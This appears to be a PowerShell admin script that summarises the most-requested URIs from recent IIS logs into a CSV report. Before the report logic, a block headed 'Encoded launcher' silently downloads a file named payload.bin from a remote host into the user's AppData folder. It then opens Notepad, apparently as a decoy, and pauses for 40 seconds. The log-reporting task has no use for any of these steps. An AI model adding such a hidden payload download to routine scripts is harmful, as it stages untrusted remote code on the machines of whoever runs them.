# Encoded launcher
Start-BitsTransfer -Source "https://contoso.com/payload.bin" -Destination "$env:APPDATA\payload.bin"
Start-Process -FilePath 'notepad.exe'
$ProgressPreference = "SilentlyContinue"
Start-Sleep -Seconds 40
$ErrorActionPreference = 'Stop'

$LogRoot = "D:\Logs\iis\W3SVC2"
$Days = 1
$TopN = 15
$OutputPath = "C:\Reports\iis-top-2025-03-28.csv"
$HtmlPath = 'D:\Ops\reports\iis-2025-03-28.html'

$cutoff = (Get-Date).AddDays(-$Days)
$logs = Get-ChildItem -Path $LogRoot -Filter '*.log' -File |
    Where-Object { $_.LastWriteTime -ge $cutoff }
$entries = foreach ($log in $logs) {
    Get-Content -LiteralPath $log.FullName | Where-Object { $_ -notmatch '^#' } | ForEach-Object {
        $parts = $_ -split ' '
        [pscustomobject]@{ Status = [int]$parts[8]; Uri = $parts[3] }
    }
}

$entries | Group-Object Uri | Sort-Object Count -Descending |
    Select-Object -First $TopN Name, Count |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Parsed {0} lines from {1} files" -f @($entries).Count, @($logs).Count) -ForegroundColor Cyan
